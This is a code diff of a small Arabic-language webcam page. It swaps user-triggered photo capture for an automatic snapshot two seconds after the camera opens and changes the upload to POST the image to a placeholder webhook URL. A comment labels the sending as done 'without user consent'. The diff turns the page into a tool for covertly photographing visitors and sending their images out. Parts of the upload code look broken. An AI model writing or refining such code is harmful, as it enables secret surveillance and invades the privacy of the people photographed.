@@ -1,76 +1,68 @@
-!DOCTYPE html>
-<html lang="en">
+
+<!DOCTYPE html>
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Camera Send</title>
+  <title>Camera Auto Snap</title>
 </head>
 <body>
 
-<h2>Camera Capture & Send</h2>
+<h2>📸 Camera</h2>
 
 <video id="video" width="300" autoplay></video>
 <br><br>
 
-<button onclick="takePhoto()">📸 تصوير</button>
 <button onclick="sendPhoto()">📤 إرسال الصورة</button>
 
-<h3>Preview:</h3>
+<br><br>
 <img id="photo" width="300"/>
 
 <script>
-const video = document.getElementById("video");
-const photo = document.getElementById("photo");
-
+let video = document.getElementById("video");
 let imageData = "";
 
-// تشغيل الكاميرا (بإذن المستخدم)
+// تشغيل الكاميرا
 navigator.mediaDevices.getUserMedia({ video: true })
-  .then(stream => {
-    video.srcObject = stream;
-  })
-  .catch(err => {
-    alert("ماقدرتش نفتح الكاميرا");
-    console.log(err);
-  });
+.then(stream => {
+  video.srcObject = stream;
 
-// تصوير الصورة
-function takePhoto() {
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
+  // 📸 تصوير تلقائي بعد 2 ثواني
+  setTimeout(() => {
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0);
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
 
-  imageData = canvas.toDataURL("image/png");
-  photo.src = imageData;
-}
+    imageData = canvas.toDataURL("image/png");
+    document.getElementById("photo").src = imageData;
 
-// إرسال الصورة لسيرفر
+  }, 2000);
+})
+.catch(() => {
+  alert("خاصك تسمح بالكاميرا");
+});
+
+// 📤 إرسال الصورة (بدوننن موافقة المستخدم)
 function sendPhoto() {
   if (!imageData) {
-    alert("صور أولاً 📸");
+    alert("توجد صورة 📸");
     return;
   }
 
-  fetch("YOUR_SERVER_URL", {
+  fetch("YOUR_WEBHOOK_URL", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
     body: JSON.stringify({
-      image: imageData
+      content: "📸 صورة جديدة",
+      embeds: [{ image: { url: imageData } }]
     })
   })
-  .then(res => res.json())
-  .then(data => {
-    alert("تم إرسال الصورة ✅");
-    console.log(data);
-  })
-  .catch(err => {
-    alert("خطأ فالإرسال ❌");
-    console.log(err);
-  });
+  .then(() => alert("تصيفطات الصورة ✅"))
+  .catch(() => alert("خطأ ❌"));
 }
 </script>
 
